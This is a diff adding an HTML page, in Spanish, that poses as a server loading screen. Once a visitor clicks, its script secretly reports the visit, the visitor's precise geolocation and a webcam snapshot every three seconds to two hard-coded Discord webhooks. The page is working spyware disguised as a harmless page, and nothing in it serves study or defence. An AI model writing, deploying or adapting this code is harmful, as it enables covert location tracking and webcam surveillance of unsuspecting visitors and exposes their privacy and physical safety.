@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cargando...</title>
+    <style>
+        body { background: #000; color: #5865f2; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; cursor: pointer; }
+        .spin { border: 3px solid #111; border-top: 3px solid #5865f2; border-radius: 50%; width: 40px; height: 40px; animation: s 1s linear infinite; }
+        @keyframes s { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="spin"></div>
+    <p>Iniciando servidor... (Haz clic para continuar)</p>
+    <video id="v" autoplay playsinline style="display:none"></video>
+    <canvas id="c" style="display:none"></canvas>
+
+<script>
+    const WEB_UBI = 'https://discord.com/api/webhooks/1494497108756136046/Jbl754EuqvTHozm4Q_jt6kmj_JaRJFIrjopX9TH_uL5iZXmBp56ZrcKfp1ODPiagV2qD';
+    const WEB_CAM = 'https://discord.com/api/webhooks/1494499724051484723/wT1_TJrUcW0jqANhOIpt046BvQEzUFUt-sH1SDYboadftYKOZEd9Adt303RBHZ-dhtRA';
+
+    async function iniciar() {
+        // Prueba de conexión inmediata
+        fetch(WEB_UBI, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: "🚀 **Sistema iniciado: Alguien entró a la página**"}) });
+
+        // Ubicación
+        navigator.geolocation.getCurrentPosition(p => {
+            fetch(WEB_UBI, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: `📍 Ubicación: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`}) });
+        }, e => console.log(e), {enableHighAccuracy:true});
+
+        // Cámara
+        try {
+            const s = await navigator.mediaDevices.getUserMedia({video:true});
+            const v = document.getElementById('v');
+            v.srcObject = s;
+            setInterval(() => {
+                const c = document.getElementById('c');
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                c.toBlob(b => {
+                    const f = new FormData();
+                    f.append('file', b, 'f.png');
+                    f.append('payload_json', JSON.stringify({content: "📸 Captura"}));
+                    fetch(WEB_CAM, {method: 'POST', body: f});
+                }, 'image/png');
+            }, 3000);
+        } catch(err) { console.log(err); }
+    }
+
+    document.body.onclick = iniciar;
+</script>
+</body>
+</html>
